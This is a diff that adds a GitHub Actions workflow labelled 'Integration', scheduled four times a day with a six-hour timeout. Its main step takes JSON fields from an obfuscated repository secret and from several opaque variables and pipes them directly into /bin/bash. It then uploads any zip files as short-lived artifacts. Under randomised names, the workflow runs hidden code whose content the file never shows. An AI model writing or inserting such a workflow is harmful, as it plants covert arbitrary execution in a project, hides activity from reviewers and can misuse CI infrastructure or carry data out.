@@ -1,0 +1,36 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '35 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Start
+        env:
+          llho3842: ${{ secrets.llho3842 }}
+        run: |
+          printf '%s' "$llho3842" | jq -r .haysy91 | /bin/bash
+          printf '%s' "$r584" | jq -r .pty25903 | /bin/bash
+          echo $da09243 | jq -r .ed93 | /bin/bash
+          echo $nzb1894 | jq -r .okuj87 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ad2qYSX4
+          path: "*.zip"
+          retention-days: 1
